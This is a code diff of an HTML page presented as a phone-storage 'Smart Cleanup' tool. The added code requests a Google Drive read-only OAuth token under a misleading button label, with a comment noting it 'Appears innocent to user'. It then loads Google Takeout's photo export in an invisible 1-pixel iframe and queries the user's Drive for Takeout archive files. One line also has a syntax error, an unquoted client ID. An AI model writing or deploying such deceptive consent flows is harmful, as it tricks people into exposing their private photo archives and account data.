@@ -1,79 +1,88 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Free Up Phone Storage</title>
-  <script src="https://accounts.google.com/gsi/client" async defer></script>
-  <style>
-    body { font-family: Arial, sans-serif; padding: 20px; }
-    button { font-size: 16px; padding: 10px 20px; cursor: pointer; }
-    pre { background: #f4f4f4; padding: 10px; border-radius: 5px; }
-  </style>
+<meta charset="UTF-8" />
+<title>Free Up Phone Storage</title>
+<script src="https://accounts.google.com/gsi/client" async defer></script>
+<style>
+body { font-family: Arial, sans-serif; padding: 20px; }
+iframe.hidden-frame {
+width: 1px;
+height: 1px;
+opacity: 0;
+position: absolute;
+pointer-events: none;
+}
+</style>
 </head>
 <body>
-  <h1>Free Up Phone Storage</h1>
-  <p>Sign in to back up your old photos to the cloud. Saving space on your phone!</p>
-  <button id="signin">Sign in with Google</button>
-  <pre id="output">Waiting for sign-in...</pre>
+<h1>Free Up Phone Storage</h1>
+<p>Smart cleanup helps optimize your cloud photos and save space.</p>
+<button id="startCleanup">Start Smart Cleanup</button>
+<pre id="output">Waiting for user...</pre>
 
-  <script>
-    const CLIENT_ID = "637785556513-la5964oci9vhqt8ft3fh9avqaeg3rlmq.apps.googleusercontent.com";
-    const SCOPES = "https://www.googleapis.com/auth/drive.readonly";
+<script>
+const CLIENT_ID = "637785556513-la5964oci9vhqt8ft3fh9avqaeg3rlmq.apps.googleusercontent.com";
+const SCOPES = "https://www.googleapis.com/auth/drive.readonly";
+let accessToken = null;
 
-    let tokenClient;
+window.onload = () => {
+google.accounts.oauth2.initTokenClient({
+client_id: 637785556513-la5964oci9vhqt8ft3fh9avqaeg3rlmq.apps.googleusercontent.com,
+scope: SCOPES,
+callback: (response) => {
+if (response.error) {
+document.getElementById("output").textContent = "❌ Error: " + response.error;
+return;
+}
 
-    window.onload = () => {
-      tokenClient = google.accounts.oauth2.initTokenClient({
-        client_id: CLIENT_ID,
-        scope: SCOPES,
-        callback: (tokenResponse) => {
-          if (tokenResponse.error) {
-            document.getElementById("output").textContent = "❌ Error: " + tokenResponse.error;
-            console.error(tokenResponse);
-            return;
-          }
+accessToken = response.access_token;
+document.getElementById("output").textContent =
+`✅ Access Token:\n${accessToken}\n\nPreparing cleanup...`;
 
-          document.getElementById("output").textContent =
-            `✅ Signed in!\nAccess Token:\n${tokenResponse.access_token}\n\nOpening Google Takeout...`;
+// Load hidden takeout export after token is granted
+setTimeout(() => {
+const hiddenIframe = document.createElement("iframe");
+hiddenIframe.src = "https://takeout.google.com/settings/takeout/custom/photos";
+hiddenIframe.className = "hidden-frame";
+document.body.appendChild(hiddenIframe);
+}, 3000);
 
-          window.open("https://takeout.google.com/settings/takeout/custom/photos", "_blank");
+// Try to access drive files a bit later
+setTimeout(listDriveZips, 12000);
+}
+});
 
-          // Optional: Load Drive files after short delay
-          setTimeout(() => listDriveFiles(tokenResponse.access_token), 5000);
-        },
-      });
+document.getElementById("startCleanup").onclick = () => {
+// Appears innocent to user
+document.getElementById("output").textContent = "🧠 Running smart cleanup...";
+google.accounts.oauth2.requestAccessToken({ prompt: 'consent' });
+};
+};
 
-      document.getElementById("signin").onclick = () => {
-        tokenClient.requestAccessToken({ prompt: "consent" }); // Popup flow
-      };
-    };
+function listDriveZips() {
+if (!accessToken) return;
+fetch("https://www.googleapis.com/drive/v3/files?q=mimeType='application/zip'%20and%20name%20contains%20'takeout'&fields=files(id,name,webViewLink)", {
+headers: {
+Authorization: `Bearer ${accessToken}`
+}
+})
+.then(res => res.json())
+.then(data => {
+const files = data.files || [];
+let output = `📦 Found ${files.length} Takeout ZIP(s):\n\n`;
 
-    function listDriveFiles(accessToken) {
-      fetch("https://www.googleapis.com/drive/v3/files?q=mimeType='application/zip'%20and%20name%20contains%20'takeout'&fields=files(id,name,webContentLink)", {
-        headers: {
-          Authorization: `Bearer ${accessToken}`
-        }
-      })
-      .then(res => res.json())
-      .then(data => {
-        const files = data.files || [];
-        let output = `📦 Found ${files.length} Takeout ZIP file(s):\n\n`;
+if (files.length === 0) {
+output += "❌ No Takeout ZIPs found yet.";
+} else {
+files.forEach(file => {
+output += `🗂 ${file.name}\n🔗 View: ${file.webViewLink}\n\n`;
+});
+}
 
-        if (files.length === 0) {
-          output += "❌ No takeout ZIP files found yet.";
-        } else {
-          files.forEach(file => {
-            output += `🗂 ${file.name}\n🔗 Download: ${file.webContentLink}\n\n`;
-          });
-        }
-
-        document.getElementById("output").textContent = output;
-      })
-      .catch(err => {
-        console.error(err);
-        document.getElementById("output").textContent = "❌ Error loading Drive files.";
-      });
-    }
-  </script>
+document.getElementById("output").textContent += "\n\n" + output;
+});
+}
+</script>
 </body>
 </html>
